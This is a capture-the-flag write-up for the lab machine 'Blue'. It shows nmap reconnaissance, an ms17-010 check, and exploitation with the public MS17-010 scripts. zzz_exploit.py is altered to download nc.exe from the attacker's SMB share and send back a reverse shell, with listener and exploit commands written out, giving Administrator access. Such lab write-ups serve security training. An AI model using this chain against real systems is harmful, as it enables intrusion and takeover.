

![1](</Writeups/Machines/Blue/img/logo.png>)
By Rug4lo

## Reconnaissance 

First we are going to run reconnaissance against this machine with Nmap
```bash
nmap -p- --open -T5 -sS -min-rate 5000 -vvv -n -Pn -oG allPorts 10.10.10.40
```
```bash
Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times may be slower.
Starting Nmap 7.93 ( https://nmap.org ) at 2023-10-06 18:58 CEST
Initiating SYN Stealth Scan at 18:58
Scanning 10.10.10.40 [65535 ports]
Discovered open port 139/tcp on 10.10.10.40
Discovered open port 445/tcp on 10.10.10.40
Discovered open port 135/tcp on 10.10.10.40
Discovered open port 49153/tcp on 10.10.10.40
Discovered open port 49155/tcp on 10.10.10.40
Discovered open port 49154/tcp on 10.10.10.40
Discovered open port 49157/tcp on 10.10.10.40
Discovered open port 49152/tcp on 10.10.10.40
Discovered open port 49156/tcp on 10.10.10.40
Completed SYN Stealth Scan at 18:58, 18.24s elapsed (65535 total ports)
Nmap scan report for 10.10.10.40
Host is up, received user-set (0.11s latency).
Scanned at 2023-10-06 18:58:13 CEST for 18s
Not shown: 64405 closed tcp ports (reset), 1121 filtered tcp ports (no-response)
Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
PORT      STATE SERVICE      REASON
135/tcp   open  msrpc        syn-ack ttl 127
139/tcp   open  netbios-ssn  syn-ack ttl 127
445/tcp   open  microsoft-ds syn-ack ttl 127
49152/tcp open  unknown      syn-ack ttl 127
49153/tcp open  unknown      syn-ack ttl 127
49154/tcp open  unknown      syn-ack ttl 127
49155/tcp open  unknown      syn-ack ttl 127
49156/tcp open  unknown      syn-ack ttl 127
49157/tcp open  unknown      syn-ack ttl 127

Read data files from: /usr/bin/../share/nmap
Nmap done: 1 IP address (1 host up) scanned in 18.42 seconds
           Raw packets sent: 89681 (3.946MB) | Rcvd: 73592 (2.944MB)
```
We can see several open ports, now we are going to use nmap's default scripts to pull more information about these ports
```bash
nmap -sCV -p135,139,445,49152,49153,49154,49155,49156,49157 10.10.10.40 -oN Targeted 
```
```bash
# Nmap 7.93 scan initiated Thu Oct  5 19:18:16 2023 as: nmap -sCV -p135,139,445,49152,49153,49154,49155,49156,49157 -oN Targeted 10.10.10.40
Nmap scan report for 10.10.10.40
Host is up (0.11s latency).

PORT      STATE SERVICE      VERSION
135/tcp   open  msrpc        Microsoft Windows RPC
139/tcp   open  netbios-ssn  Microsoft Windows netbios-ssn
445/tcp   open  microsoft-ds Windows 7 Professional 7601 Service Pack 1 microsoft-ds (workgroup: WORKGROUP)
49152/tcp open  msrpc        Microsoft Windows RPC
49153/tcp open  msrpc        Microsoft Windows RPC
49154/tcp open  msrpc        Microsoft Windows RPC
49155/tcp open  msrpc        Microsoft Windows RPC
49156/tcp open  msrpc        Microsoft Windows RPC
49157/tcp open  msrpc        Microsoft Windows RPC
Service Info: Host: HARIS-PC; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
|_clock-skew: mean: -19m54s, deviation: 34m35s, median: 3s
| smb-security-mode: 
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
| smb2-time: 
|   date: 2023-10-05T17:19:26
|_  start_date: 2023-10-05T01:05:10
| smb2-security-mode: 
|   210: 
|_    Message signing enabled but not required
| smb-os-discovery: 
|   OS: Windows 7 Professional 7601 Service Pack 1 (Windows 7 Professional 6.1)
|   OS CPE: cpe:/o:microsoft:windows_7::sp1:professional
|   Computer name: haris-PC
|   NetBIOS computer name: HARIS-PC\x00
|   Workgroup: WORKGROUP\x00
|_  System time: 2023-10-05T18:19:27+01:00

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Thu Oct  5 19:19:29 2023 -- 1 IP address (1 host up) scanned in 72.49 seconds
```
Since the Windows version is an old one, we can check whether it is vulnerable to EternalBlue
```bash
nmap -p135,139,445,49152,49153,49154,49155,49156,49157 10.10.10.40 --script smb-vuln-ms17-010
```
```bash
Host script results:
| smb-vuln-ms17-010: 
|   VULNERABLE:
|   Remote Code Execution vulnerability in Microsoft SMBv1 servers (ms17-010)
|     State: VULNERABLE
|     IDs:  CVE:CVE-2017-0143
|     Risk factor: HIGH
|       A critical remote code execution vulnerability exists in Microsoft SMBv1
|        servers (ms17-010).
|           
|     Disclosure date: 2017-03-14
|     References:
|       https://blogs.technet.microsoft.com/msrc/2017/05/12/customer-guidance-for-wannacrypt-attacks/
|       https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-0143
|_      https://technet.microsoft.com/en-us/library/security/ms17-010.aspx
```
Now that we have seen it is vulnerable, we can use this github repository to exploit it

Repository --> https://github.com/worawit/MS17-010

Once the repository is downloaded we are going to use cheker.py to check whether it is vulnerable

![1](</Writeups/Machines/Blue/img/1.png>)

We can see that it does not detect any pipe, so it is not vulnerable, but if we change a parameter in cheker.py to tell it to use the guest user

![1](</Writeups/Machines/Blue/img/2.png>)

We will see that when we run it again it detects several pipes 

![1](</Writeups/Machines/Blue/img/3.png>)

## EternalBlue exploitation

If we modify zzz_exploit.py so that it uses the "gest" user 

![1](</Writeups/Machines/Blue/img/4.png>)

And we modify the code so that it runs the command we want (one that downloads the netcat.exe we are going to upload to our SMB service and runs it to send us a reverse shell)

![1](</Writeups/Machines/Blue/img/5.png>)

Before running the script, we are going to set up an smb server in the directory where we have nc.exe
```bash
python3 smbserver.py smbFolder $(pwd) -smb2support
```
Finally we start a listener on port 4444
```bash
nc -nlvp 4444
```
Now we run the zzz_exploit.py script
```bash
python2 zzz_exploit.py 10.10.10.40 samr
```
The command will be executed:

![1](</Writeups/Machines/Blue/img/6.png>)

And we will gain access as Administrator 

![1](</Writeups/Machines/Blue/img/7.png>)